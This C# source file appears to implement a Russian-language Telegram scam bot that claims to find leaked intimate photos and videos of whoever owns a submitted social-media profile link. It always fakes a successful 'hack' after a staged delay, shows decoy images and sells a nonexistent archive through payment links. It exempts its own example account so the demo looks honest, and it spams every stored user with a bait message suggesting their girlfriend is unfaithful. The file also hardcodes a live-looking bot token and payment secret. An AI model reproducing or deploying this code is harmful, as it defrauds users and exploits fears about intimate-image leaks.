using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.ReplyMarkups;
using static System.Net.WebRequestMethods;

namespace BotIntim
{
    class Program
    {
        private static TelegramBotClient _botClient;
        private static TimerCallback tm = new TimerCallback(send30MinuteMessage);
        private static Timer timer;
        private static List<long> users_id_in_bot = new List<long>();
        static void Main(string[] args)
        {
            //перед запуском создать в папке bin текстовый файл users_in_bot.txt
            //в нём храняться id для отправки всем пользователям сообщение

            _botClient = new TelegramBotClient("6083014604:AAGI5ByYjcMpRpE9DrfRLEB6G1B_NOCh8-U");
            using(StreamReader reader = new StreamReader("../../users_in_bot.txt"))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    users_id_in_bot.Add(long.Parse(line));
                }
            }
            _botClient.OnMessage += OnMessageHandler;
            _botClient.OnCallbackQuery += OnCallbackQueryHandler;
            timer = new Timer(tm, null, 0, 6000000);
      
            _botClient.StartReceiving();
            Console.WriteLine("Bot started...");

            Thread.Sleep(Timeout.Infinite);
        }
        private static async void send30MinuteMessage(object obj)
        {
            for(int i =0; i < users_id_in_bot.Count; i++)
            {
                try
                {
                    using (var stream = System.IO.File.Open("../../photo_spam.jpg", FileMode.Open))
                    {
                        var fileToSend = new InputOnlineFile(stream);
                        await _botClient.SendPhotoAsync(users_id_in_bot[i], fileToSend, caption: "А ты точно уверен в своей дeвушкe ?😍\r\n\r\n\U0001f98bМожет всё - таки yбедимcя ? Мне кажется всё плохо.. ❌\r\n\r\nПровeрить /start /start /start");
                    }
                }
                catch
                {

                }
            }
        }
        private static async void OnMessageHandler(object sender, MessageEventArgs e)
        {
            var message = e.Message;
            if (message == null || message.Type != Telegram.Bot.Types.Enums.MessageType.Text)
                return;

            var chatId = message.Chat.Id;
            var text = message.Text;

            if (text == "/start")
            {
                if (!users_id_in_bot.Contains(chatId))
                {
                    users_id_in_bot.Add(chatId);
                    using(StreamWriter writer = new StreamWriter("../../users_in_bot.txt"))
                    {
                        writer.WriteLine(chatId);
                    }
                }
                var mainMenuKeyboard = new ReplyKeyboardMarkup(new[]
                {
                    new List<KeyboardButton>() { new KeyboardButton { Text = "🔎Найти сливы🔍" } },
                        new List<KeyboardButton>() { new KeyboardButton { Text = "🕵️‍Тех.поддержка🕵️‍" } },
                });

                await _botClient.SendTextMessageAsync(chatId, "Выберите пункт меню:", replyMarkup: mainMenuKeyboard);
            }
            else if (text == "🔎Найти сливы🔍")
            {
                var submenuKeyboard = new InlineKeyboardMarkup(new[]
                {
                    new[]
                    {
                        InlineKeyboardButton.WithCallbackData("📷 Instagram", "sub_insta"),
                    },
                    new[]
                    {
                       InlineKeyboardButton.WithCallbackData("💎 Telegram", "sub_tg"),
                    },
                     new[]
                    {
                       InlineKeyboardButton.WithCallbackData("🌍 VK", "sub_vk"),
                    },
                      new[]
                    {
                      InlineKeyboardButton.WithCallbackData("🔮Facebook", "sub_facebook"),
                    },
                });

                await _botClient.SendTextMessageAsync(chatId, "Выберите нужную вам соц.сеть 👇", replyMarkup: submenuKeyboard);
            }
            else if (text == "🕵️‍Тех.поддержка🕵️‍")
            {
                await _botClient.SendTextMessageAsync(chatId, "🤑Тг админа - https://t.me/thmamiris🤑");
            }
            else if (text.StartsWith("https://") && !text.Contains("el_primka_7"))
            {
                await _botClient.SendTextMessageAsync(chatId, "🔎 Ищем все возможные сливы...");
                Thread.Sleep(8000);
                using (var stream1 = new FileStream("../../obman1.jpg", FileMode.Open))
                {
                    using (var stream2 = new FileStream("../../obman2.jpg", FileMode.Open))
                    {
                        var photo1 = new InputMediaPhoto(new InputMedia(stream1, "../../obman1.jpg"));
                        var photo2 = new InputMediaPhoto(new InputMedia(stream2, "../../obman2.jpg"));


                        List<IAlbumInputMedia> mediaGroup = new List<IAlbumInputMedia>
                {
                    photo1,
                    photo2
                };
                        await _botClient.SendMediaGroupAsync(chatId,mediaGroup, disableNotification: false);

                    }

                }
     
                Uri uri = new Uri(text);
                string username = uri.Segments.Last().Trim('/');
                await _botClient.SendTextMessageAsync(chatId, $"Взлом найден ✅\n\nНик: {username}\nДата взлома 03.10.2023\nИнтим фото: В наличии ✅\nИнтим видео: В наличии ✅");

                var submenuKeyboard = new InlineKeyboardMarkup(new[]
               {
                    new[]
                    {
                        InlineKeyboardButton.WithCallbackData("💳 Приобрести архив", "sub_buy_archive"),
                    },
                    new[]
                    {
                       InlineKeyboardButton.WithCallbackData("🔎 Безлимитный поиск", "sub_buy_bezlimit"),
                    },
                     new[]
                    {
                       InlineKeyboardButton.WithCallbackData("🔞 Купить скачанные переписки", "sub_buy_messages"),
                    },
                });

                await _botClient.SendTextMessageAsync(chatId, $"💳 Доступны все возможные методы оплаты\n{username} | 🇷🇺 399 RUB | 🇺🇸 4 USD | 🇺🇦 160 UAH\n 🗂Архив взломаной страницы уже сформирован. Все диалоги и вложения страницы готовы к отправке.",replyMarkup:submenuKeyboard);
            }
            else if (text.Contains("el_primka_7"))
            {
                await _botClient.SendTextMessageAsync(chatId, "❌ Не найдено ни одного слива ❌");
            }
            else
            {
                await _botClient.SendTextMessageAsync(chatId, "Неверная команда или ссылка. Попробуйте снова.");
            }
        }

        private static async void OnCallbackQueryHandler(object sender, CallbackQueryEventArgs e)
        {
            var submenuKeyboard = new InlineKeyboardMarkup(new[]
{

                new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "Карта РФ 🇷🇺",
                    url: GetPaymentMethod("cards_ru").Result)
                },
                 new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "Карта Украина 🇺🇦",
                         url: GetPaymentMethod("cards_ua").Result)
                },
                  new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "Карты Казахстан 🇰🇿",
                         url: GetPaymentMethod("cards_kz").Result)
                },
                   new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "QIWI 🥝",
                         url: GetPaymentMethod("cards_qiwi").Result)
                },
                    new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "ЮMoney 🔯",
                 url: GetPaymentMethod("cards_yoomoney").Result)
                },
                     new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "Мегафон📱",
                  url: GetPaymentMethod("megafon_ru").Result)
                },
                      new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "Tether(BSC) 💎",
                    url: GetPaymentMethod("tether_bsc").Result)
                },
                            new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "Tether(TRC20) 💎",
                    url: GetPaymentMethod("tether_trc20").Result)
                },
                       new[]
                {
                    InlineKeyboardButton.WithUrl(
                    text: "Другие способы оплаты здесь 👑",
                    url: GetPaymentMethod().Result)
                },
                });

            var callbackQuery = e.CallbackQuery;
            var chatId = callbackQuery.Message.Chat.Id;
            var data = callbackQuery.Data;

            if (data == "sub_insta")
            {
                await _botClient.SendTextMessageAsync(chatId, "🔗 Отправьте боту ссылку на страницу Instagram аккаунта\r\n\r\nПример 👉 https://www.instagram.com/el_primka_7");
            }
            else if (data == "sub_tg")
            {
                await _botClient.SendTextMessageAsync(chatId, "🔗 Отправьте боту ссылку на страницу Telegram аккаунта\r\n\r\nПример 👉 https://t.me/el_primka_7");
            }
            else if (data == "sub_vk")
            {
                await _botClient.SendTextMessageAsync(chatId, "🔗 Отправьте боту ссылку на страницу VK аккаунта\r\n\r\nПример 👉 https://www.vk.com/el_primka_7");
            }
            else if (data == "sub_facebook")
            {
                await _botClient.SendTextMessageAsync(chatId, "🔗 Отправьте боту ссылку на страницу Facebook аккаунта\r\n\r\nПример 👉 https://www.facebook.com/el_primka_7");
            }
            else if (data == "sub_buy_archive")
            {
 
                await _botClient.SendTextMessageAsync(chatId, "Выберите способ оплаты 👇", replyMarkup: submenuKeyboard);
            }
            else if (data == "sub_buy_bezlimit")
            {
                await _botClient.SendTextMessageAsync(chatId, "Выберите способ оплаты 👇", replyMarkup: submenuKeyboard);
            }
            else if (data == "sub_buy_messages")
            {
                await _botClient.SendTextMessageAsync(chatId, "Выберите способ оплаты 👇", replyMarkup: submenuKeyboard);
            }
        }
        private static async Task<string> GetPaymentMethod(string method)
        {
            Random rd = new Random();
            string order_id = "RDSZF-Q" + rd.Next(0, 1000000000);
            var apiUrl = "https://aaio.io/merchant/pay";
            string[] values = { "a8954eb7-93eb-4e4a-a785-9357a60ece53", "399", "RUB", "a3dbfbcb6bde3e124a25f6a876dd7595", order_id };
            string signin = "";
            string dataToHash = string.Join(":", values);

            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
                signin = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
                
            }

            string formContentString = "";

            using (var httpClient = new HttpClient())
            {
                var formData = new Dictionary<string, string>
        {
            { "merchant_id", "a8954eb7-93eb-4e4a-a785-9357a60ece53" },
            { "amount", "399" },
            { "sign", signin },
            { "order_id", order_id },
            { "currency", "RUB" },
            { "method", method },
            { "desc", "Product" },
            { "lang", "ru" },
        };

                formContentString = string.Join("&", formData.Select(kv => $"{kv.Key}={Uri.EscapeDataString(kv.Value)}"));
            }

            try
            {
                string requestUrl = $"{apiUrl}?{formContentString}";
                return requestUrl;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Произошла ошибка: {ex.Message}");
            }

            return "Error";
        }
        private static async Task<string> GetPaymentMethod()
        {
            Random rd = new Random();
            string order_id = "RDSZF-Q" + rd.Next(0, 1000000000);
            var apiUrl = "https://aaio.io/merchant/pay";
            string[] values = { "a8954eb7-93eb-4e4a-a785-9357a60ece53", "399", "RUB", "a3dbfbcb6bde3e124a25f6a876dd7595", order_id };
            string signin = "";
            string dataToHash = string.Join(":", values);

            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
                signin = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

            }

            string formContentString = "";

            using (var httpClient = new HttpClient())
            {
                var formData = new Dictionary<string, string>
        {
            { "merchant_id", "a8954eb7-93eb-4e4a-a785-9357a60ece53" },
            { "amount", "399" },
            { "sign", signin },
            { "order_id", order_id },
            { "currency", "RUB" },
            { "desc", "Product" },
            { "lang", "ru" },
        };

                formContentString = string.Join("&", formData.Select(kv => $"{kv.Key}={Uri.EscapeDataString(kv.Value)}"));
            }

            try
            {
                string requestUrl = $"{apiUrl}?{formContentString}";
                return requestUrl;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Произошла ошибка: {ex.Message}");
            }

            return "Error";
        }
    }
}
